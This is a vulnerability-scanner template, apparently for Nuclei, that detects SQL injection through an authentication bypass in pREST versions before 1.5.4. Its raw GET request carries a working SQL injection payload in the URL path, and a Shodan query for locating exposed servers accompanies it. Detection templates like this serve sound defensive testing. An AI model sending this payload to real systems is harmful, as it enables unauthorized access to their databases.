http:
- matchers:
  - part: body
    type: word
    words:
    - 'pq: invalid input syntax for type integer: \"PostgreSQL '
  - part: content_type
    type: word
    words:
    - application/json
  matchers-condition: and
  raw:
  - 'GET /{{database}}/information_schema".tables)s%20where%201=version()::int--/auth
    HTTP/1.1

    Host: {{Hostname}}

    '
id: prest-sqli-auth-bypass
info:
  author: mihail8531,iamnoooob,rootxharsh,pdresearch
  description: 'An authentication bypass vulnerability was introduced by changing
    the JWT whitelist configuration to use a regex pattern, allowing unauthorized
    access to any path containing /auth and leading to SQL Injection.

    '
  metadata:
    max-request: 1
    shodan-query: html:"authorization token is empty"
    verified: true
  name: pREST < 1.5.4 - SQL Injection Via Authentication Bypass
  reference:
  - https://github.com/advisories/GHSA-wm25-j4gw-6vr3
  severity: critical
  tags: sqli,prest,auth-bypass,sqli,vuln
variables:
  database: '{{database}}'
